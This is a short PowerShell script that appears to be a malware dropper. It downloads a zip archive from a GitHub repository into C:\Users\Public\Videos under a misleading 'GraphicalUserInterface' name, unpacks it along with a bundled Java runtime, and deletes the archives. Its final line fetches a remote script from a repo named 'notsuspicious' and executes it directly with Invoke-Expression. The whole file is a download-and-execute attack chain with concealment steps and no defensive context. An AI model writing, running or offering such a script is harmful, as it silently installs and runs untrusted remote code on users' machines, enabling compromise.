Invoke-WebRequest 'https://github.com/RaupenInspektor/Server/archive/refs/heads/main.zip' -OutFile 'C:\Users\Public\Videos\DoWindowsGraphicalUserInterface.zip'
Expand-archive 'C:\Users\Public\Videos\DoWindowsGraphicalUserInterface.zip' 'C:\Users\Public\Videos'
Rename-Item 'C:\Users\Public\Videos\Server-main' 'GraphicalUserInterface'
Remove-Item 'C:\Users\Public\Videos\DoWindowsGraphicalUserInterface.zip'
Expand-archive 'C:\Users\Public\Videos\GraphicalUserInterface\myapp\jre6\lib.zip' 'C:\Users\Public\Videos\GraphicalUserInterface\myapp\jre6'
Remove-Item 'C:\Users\Public\Videos\GraphicalUserInterface\myapp\jre6\lib.zip'
Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/move.ps1" -UseBasicParsing).Content
